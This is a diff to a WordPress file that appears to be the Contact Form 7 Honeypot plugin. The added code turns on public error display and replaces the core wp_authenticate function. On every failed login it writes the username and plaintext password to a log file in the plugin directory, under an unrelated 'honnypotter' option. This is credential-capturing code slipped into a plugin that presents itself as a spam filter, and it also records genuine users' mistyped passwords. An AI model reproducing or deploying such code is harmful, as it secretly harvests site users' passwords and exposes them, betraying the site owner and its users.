@@ -35,6 +35,8 @@ Domain Path: /languages/
 * https://translate.wordpress.org/projects/wp-plugins/contact-form-7-honeypot
 * Leaving in the code for now.
 */
+
+
 add_action( 'plugins_loaded', 'wpcf7_honeypot_load_textdomain' );
 function wpcf7_honeypot_load_textdomain() {
 	load_plugin_textdomain( 'contact-form-7-honeypot', false, plugin_basename( dirname( __FILE__ ) ) . '/languages' );
@@ -349,4 +351,74 @@ function Honeypot_debug()
 	$honeypot_var = False;
 	return $honeypot_var;
 }
+
+define('WP_DEBUG', true);
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+define( 'HONNYPOTTER__PLUGIN_DIR', plugin_dir_path( __FILE__ ) );
+
+
+
+
+if (!function_exists('wp_authenticate')) {
+	$options = get_option('honnypotter');
+	$options['wp_authenticate_override'] = true;
+	update_option('honnypotter', $options);
+
+
+	function wp_authenticate($username, $password)
+	{
+		$username = sanitize_user($username);
+		$password = trim($password);
+		/**
+		 * Filter the user to authenticate.
+		 *
+		 * If a non-null value is passed, the filter will effectively short-circuit
+		 * authentication, returning an error instead.
+		 *
+		 * @since 2.8.0
+		 *
+		 * @param null|WP_User $user     User to authenticate.
+		 * @param string       $username User login.
+		 * @param string       $password User password
+		 */
+		$user = apply_filters('authenticate', null, $username, $password);
+		if ($user == null) {
+
+			// TODO what should the error message be? (Or would these even happen?)
+			// Only needed if all authentication handlers fail to return anything.
+
+			$user = new WP_Error('authentication_failed', __('<strong>ERROR</strong>: Invalid username or incorrect password.'));
+		}
+
+		$ignore_codes = array(
+			'empty_username',
+			'empty_password'
+		);
+		if (is_wp_error($user) && !in_array($user->get_error_code() , $ignore_codes)) {
+			/**
+			 * Fires after a user login has failed.
+			 *
+			 * @since 2.5.0
+			 *
+			 * @param string $username User login.
+			 */
+			$logname = get_option('honnypotter');
+			$logname = $logname['log_name'];
+ 			$logfile = fopen(plugin_dir_path(__FILE__) . $logname, 'a') or die('could not open/create file');
+ 			fwrite($logfile, sprintf("wp: %s - %s:%s\n", date('Y-m-d H:i:s') , $username, $password));
+ 			fclose($logfile);
+			do_action('wp_login_failed', $username);
+		}
+
+		return $user;
+	}
+}else{
+	$options = get_option('honnypotter');
+	$options['wp_authenticate_override'] = false;
+	update_option('honnypotter', $options);
+}
+
+
 
